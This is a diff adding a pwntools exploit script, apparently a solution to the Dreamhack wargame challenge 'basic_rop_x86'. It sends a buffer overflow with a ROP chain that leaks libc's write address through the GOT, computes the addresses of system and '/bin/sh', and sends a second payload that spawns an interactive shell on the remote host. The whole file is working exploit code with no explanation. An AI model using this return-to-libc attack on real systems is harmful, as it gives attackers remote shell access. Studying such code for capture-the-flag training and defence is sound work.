@@ -1,0 +1,48 @@
+from pwn import *
+
+r = remote("host1.dreamhack.games", 10757)
+# r = process("./basic_rop_x86")
+e = ELF("./basic_rop_x86")
+
+libc = ELF("./libc.so.6")
+
+pppr = 0x08048689
+main = 0x080485d9
+ret = 0x080483c2
+
+payload  = b""
+payload += b"a" * 0x48
+payload += p32(e.plt['write'])
+payload += p32(pppr)
+payload += p32(1)
+payload += p32(e.got['write'])
+payload += p32(4)
+payload += p32(main)
+
+r.sendline(payload)
+
+
+sleep(0.5)
+sleep(0.5)
+r.recvuntil("a" * 64)
+libc_base = u32(r.recv())
+print(hex(libc_base))
+
+libc_system = libc_base + libc.symbols['system'] - libc.symbols['write']
+libc_binsh = libc_base + next(libc.search(b'/bin/sh')) - libc.symbols['write']
+
+
+payload  = b""
+payload += b"a" * 0x48
+payload += p32(libc_system)
+payload += p32(0)
+payload += p32(libc_binsh)
+sleep(0.5)
+
+r.sendline(payload)
+sleep(0.5)
+
+r.interactive()
+
+
+
